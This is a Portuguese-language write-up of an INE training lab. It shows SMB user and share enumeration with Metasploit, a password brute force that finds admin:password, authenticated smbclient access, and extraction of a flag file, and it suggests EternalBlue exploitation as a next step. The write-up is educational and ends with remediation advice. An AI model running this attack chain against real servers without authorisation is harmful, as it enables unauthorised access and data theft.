# 🧪 Lab Report — SMB: Enumeração, Brute Force e Acesso a Shares

> **Plataforma:** INE
> **Tema central:** Enumeração de usuários e shares SMB → Brute force de credencial → Acesso autenticado → Extração de arquivo
> **Alvo:** `demo.ine.local` / `192.67.158.3`

---

## 🎯 Objetivo

Partir do zero e comprometer completamente um servidor Samba usando apenas enumeração passiva e brute force — sem exploit. Localizar e extrair um arquivo sensível dentro de um share autenticado.

---

## 📋 Sumário de Etapas

| # | Ação | Módulo / Comando | Resultado |
|---|------|-----------------|-----------|
| 1 | Portas TCP abertas | `nmap` | 139, 445 |
| 2 | Versão do Samba | `smb_version` | Samba 4.3.11-Ubuntu |
| 3 | Enumeração de usuários | `smb_enumusers` | john, elie, aisha, shawn, emma, admin |
| 4 | Enumeração de shares | `smb_enumshares` | public, john, aisha, emma, everyone, IPC$ |
| 5 | Brute force SMB | `smb_login` | `admin:password` |
| 6 | Listagem autenticada | `smbclient -L` | Shares confirmados |
| 7 | Acesso ao share `public` | `smbclient` | Diretório `secret/` encontrado |
| 8 | Download do arquivo | `get flag` | Flag extraída ✅ |

---

## 🔬 Execução Passo a Passo

### Step 1 — Portas TCP do SMB

```bash
nmap demo.ine.local
```

**Por quê:** Confirmar que as portas SMB padrão estão abertas antes de carregar qualquer módulo. Scan sem flags usa as top 1000 portas TCP — suficiente para encontrar 139 e 445.

**Resultado:**
```
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
```

---

### Step 2 — Versão do Samba

```bash
msfconsole -q

use auxiliary/scanner/smb/smb_version
set RHOSTS 192.67.158.3
run
```

**Por quê começar pela versão:** Versão exata direciona a busca por CVEs específicos e confirma o contexto (Samba vs Windows SMB nativo). Também revela os dialetos SMB suportados.

**Resultado:**
```
SMB Detected (versions:1, 2, 3) (preferred dialect:SMB 3.1.1)
Host: Windows 6.1 (Samba 4.3.11-Ubuntu)
Authentication domain: SAMBA-RECON
```

**O que extrair desse output:**

| Campo | Valor | Relevância |
|-------|-------|-----------|
| Versions | 1, 2, 3 | SMBv1 ativo = vulnerável ao EternalBlue |
| Preferred dialect | SMB 3.1.1 | Versão mais moderna negociada |
| Authentication domain | SAMBA-RECON | Nome do domínio para ataques de auth |

> ⚠️ SMBv1 ainda ativo é um red flag. É o protocolo explorado pelo **MS17-010 (EternalBlue)**. Em um pentest real, isso seria testado imediatamente.

---

### Step 3 — Enumeração de Usuários

```bash
use auxiliary/scanner/smb/smb_enumusers
set RHOSTS 192.67.158.3
run
```

**Por quê enumerar usuários antes de brute force:** Brute force com lista genérica de usuários é lento e ruidoso. Saber os nomes reais dos usuários do sistema transforma um ataque de força bruta completo em um ataque **cirúrgico** — só testamos senhas contra contas que existem.

**Como o módulo funciona:** Usa o protocolo RPC via SMB (null session ou credencial) para consultar o SAM (Security Account Manager) e listar contas locais.

**Resultado:**
```
SAMBA-RECON [ john, elie, aisha, shawn, emma, admin ] ( LockoutTries=0 PasswordMin=5 )
```

**O que cada campo revela:**

| Campo | Valor | Implicação |
|-------|-------|-----------|
| Usuários | john, elie, aisha, shawn, emma, admin | Alvos para brute force |
| LockoutTries | 0 | **Sem política de bloqueio** — brute force sem risco de lockout |
| PasswordMin | 5 | Senha mínima de apenas 5 caracteres — senhas fracas são prováveis |

> 🎯 `LockoutTries=0` é o detalhe mais importante. Você pode tentar infinitas senhas sem travar nenhuma conta. Verde para brute force agressivo.

---

### Step 4 — Enumeração de Shares

```bash
use auxiliary/scanner/smb/smb_enumshares
set RHOSTS 192.67.158.3
run
```

**Por quê enumerar shares antes de atacar:** Saber o que existe no servidor orienta o objetivo. Um share chamado `public` ou com nome de usuário sugere que há arquivos acessíveis. Shares administrativos (`ADMIN$`, `C$`) indicam acesso privilegiado.

**Resultado:**
```
public    - (DISK)
john      - (DISK)
aisha     - (DISK)
emma      - (DISK)
everyone  - (DISK)
IPC$      - (IPC|SPECIAL) IPC Service (samba.recon.lab)
```

**Interpretação:**

| Share | Tipo | O Que Sugere |
|-------|------|-------------|
| `public` | DISK | Share público — provável acesso sem restrição forte |
| `john`, `aisha`, `emma` | DISK | Shares pessoais dos usuários enumerados |
| `everyone` | DISK | Potencialmente acessível por todos os usuários |
| `IPC$` | IPC | Canal de comunicação RPC — base para enumeração |

> 💡 O share `public` é o alvo mais promissor para começar — o nome sugere permissões abertas e é candidato a conter arquivos acessíveis.

---

### Step 5 — Brute Force de Credencial SMB

```bash
use auxiliary/scanner/smb/smb_login
set RHOSTS 192.67.158.3
set SMBUser admin
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
run
```

**Por quê focar no usuário `admin` primeiro:** É a conta com maior probabilidade de ter privilégios administrativos e acesso a todos os shares. Se a senha for fraca (o que `PasswordMin=5` sugere), é o alvo de maior retorno.

**Por quê não incluir USER_FILE também:** Neste caso já temos a lista de usuários do Step 3. Focar em um usuário por vez é mais eficiente e menos ruidoso do que matriz usuário×senha.

**Opções relevantes do módulo:**

| Opção | Valor | Por Quê |
|-------|-------|---------|
| `SMBUser` | admin | Alvo específico |
| `PASS_FILE` | unix_passwords.txt | Wordlist de senhas Unix comuns |
| `STOP_ON_SUCCESS` | false (padrão) | Continua após encontrar — pode haver múltiplas credenciais |
| `ABORT_ON_LOCKOUT` | false (padrão) | Seguro aqui pois LockoutTries=0 |

**Resultado:**
```
[-] Failed: '.\admin:admin'
[-] Failed: '.\admin:123456'
[-] Failed: '.\admin:12345'
[-] Failed: '.\admin:123456789'
[+] Success: '.\admin:password'
```

> Credencial obtida: **`admin:password`**

---

### Step 6 — Listar Shares com Credencial Autenticada

```bash
# Sair do msfconsole
exit

smbclient -L \\\\192.67.158.3\\ -U admin
# Senha: password
```

**Por quê usar smbclient aqui em vez do módulo Metasploit:** O smbclient é um cliente interativo — permite navegar, listar e transferir arquivos. O módulo Metasploit só enumera; para interagir com o conteúdo dos shares, o cliente nativo é mais prático.

**Atenção à sintaxe:** `\\\\IP\\` — no bash, cada `\` precisa ser escapado, então `\\` = um `\` real.

**Resultado:**
```
Sharename    Type    Comment
public       Disk
john         Disk
aisha        Disk
emma         Disk
everyone     Disk
IPC$         IPC     IPC Service (samba.recon.lab)

Workgroup    Master
RECONLABS    SAMBA-RECON
```

---

### Step 7 — Acessar Share `public` e Navegar

```bash
smbclient \\\\192.67.158.3\\public -U admin
# Senha: password
```

```bash
# Dentro do smbclient
smb: \> ls
```

**Resultado:**
```
.          D    0  Tue Nov 27 19:06:13 2018
..         D    0  Tue Nov 27 19:06:13 2018
secret     D    0  Tue Nov 27 19:06:13 2018
dev        D    0  Tue Nov 27 19:06:13 2018
```

**O diretório `secret/` é o alvo óbvio.** Em um ambiente real, nomes como `secret`, `backup`, `creds`, `keys` são os primeiros a explorar.

```bash
smb: \> cd secret
smb: \secret\> ls
```

**Resultado:**
```
flag    N    33  Tue Nov 27 19:06:13 2018
```

---

### Step 8 — Baixar o Arquivo

```bash
smb: \secret\> get flag
smb: \secret\> exit
```

```bash
# No terminal do Kali
cat flag
```

**Por quê `get` em vez de `cat`:** O smbclient não executa comandos no servidor — ele transfere arquivos. `cat` dentro do smb: não existe. Você baixa o arquivo primeiro, depois lê localmente.

**Resultado:**
```
03ddb97933e716f5057a18632badb3b4
```

---

## 📊 Resultado Final

| Informação | Valor |
|-----------|-------|
| Versão | Samba 4.3.11-Ubuntu |
| Dialetos SMB | v1, v2, v3 (⚠️ SMBv1 ativo) |
| Domínio | SAMBA-RECON |
| Política de lockout | ❌ Desabilitada |
| Usuários enumerados | john, elie, aisha, shawn, emma, admin |
| Credencial obtida | `admin : password` |
| Shares acessíveis | public, john, aisha, emma, everyone |
| Arquivo extraído | `flag` → `03ddb97933e716f5057a18632badb3b4` |

---

## 🧠 Conceitos Consolidados

### A Cadeia de Enumeração SMB

```
smb_version     → contexto (versão, domínio, SMBv1?)
smb_enumusers   → quem existe (alvos para brute force)
smb_enumshares  → o que existe (alvos para acesso)
smb_login       → credencial válida
smbclient       → interação e extração de arquivos
```

Cada etapa alimenta a próxima. Você nunca parte do brute force sem saber os usuários reais.

### LockoutTries=0 — Por Que Muda Tudo
Política de lockout desabilitada significa que você pode testar **infinitas senhas** sem risco de travar a conta. Em ambientes com lockout ativo (ex: 5 tentativas), a estratégia muda completamente — você prioriza senhas mais prováveis e diminui a velocidade.

### Sintaxe do smbclient
```bash
# Listar shares
smbclient -L \\\\IP\\ -U usuario

# Conectar em share específico
smbclient \\\\IP\\nome_do_share -U usuario

# Dentro do smbclient
ls          # listar arquivos
cd pasta    # navegar
get arquivo # baixar arquivo para o diretório local
put arquivo # enviar arquivo
pwd         # diretório atual
exit        # sair
```

---

## ⚠️ Pontos de Atenção — Ambiente Real

| Achado | Risco | Recomendação |
|--------|-------|-------------|
| SMBv1 ativo | Crítico — vulnerável ao EternalBlue | Desabilitar SMBv1 imediatamente |
| LockoutTries=0 | Alto — brute force irrestrito | Habilitar lockout (3-5 tentativas) |
| PasswordMin=5 | Médio — senha fraca possível | Aumentar para mínimo 12 caracteres |
| Share `public` com dados sensíveis | Alto | Revisar permissões de compartilhamento |
| `admin:password` | Crítico — senha trivial | Rotacionar credencial imediatamente |

---

## 🔁 Próximos Passos Lógicos

```
Credencial admin obtida + SMBv1 ativo
        ↓
nmap --script smb-vuln-ms17-010 -p445 IP   ← testar EternalBlue
        ↓
use exploit/windows/smb/ms17_010_eternalblue ← se vulnerável → Meterpreter SYSTEM
        ↓
Shares pessoais (john, aisha, emma)          ← navegar com credencial admin
        ↓
rpcclient → enumdomusers → getdompwinfo      ← enumeração mais profunda via RPC
```

---

## 📌 Relacionados

- [[Samba Recon Completo]]
- [[SMB — Enumeração e Comprometimento]]
- [[Metasploit — Banco de Dados e Workspaces]]
- [[Metasploit — Fundamentos e Arquitetura]]
- [[Cheatsheet — Portas Importantes]]

#lab #exploração #protocolo/smb #ferramenta/metasploit #brute-force #windows
